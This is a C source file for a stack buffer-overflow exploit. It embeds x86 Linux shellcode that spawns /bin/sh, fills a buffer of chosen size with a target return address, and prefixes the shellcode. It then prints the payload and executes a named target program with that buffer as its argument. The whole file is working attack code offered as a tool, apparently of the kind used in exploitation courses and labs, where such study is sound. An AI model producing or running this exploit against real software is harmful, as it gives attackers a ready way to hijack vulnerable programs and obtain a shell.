#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static char shellcode[] = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";

// usage: exploit target-prog buffer-size target-addr
int main(int argc, char **argv)
{
    int i;
    char *buff, *ptr;
    char *target = argv[1];
    int bsize = atoi(argv[2]);
    long int addr = strtoul(argv[3], NULL, 0);

    printf("Generating buffer with size %d and target address %08x\n", bsize, addr);

    // allocate buffer for exploit string
    buff = malloc(bsize);

    // fill whole buffer with the target address
    for (i = 0; i < bsize; i += 4)
        memcpy(buff + i, &addr, 4);

    // put shellcode to the beginning of exploit string
    memcpy(buff, shellcode, strlen(shellcode));

    // terminate string
    buff[bsize - 1] = '\0';

    // print buffer
    printf("Running %s with argument: \"", target);
    for (i = 0; i < bsize; i++)
        printf("\\x%02hhx", buff[i]);
    printf("\"\n");

    // run target program
    execl(target, target, buff, NULL);
    return 0;
}
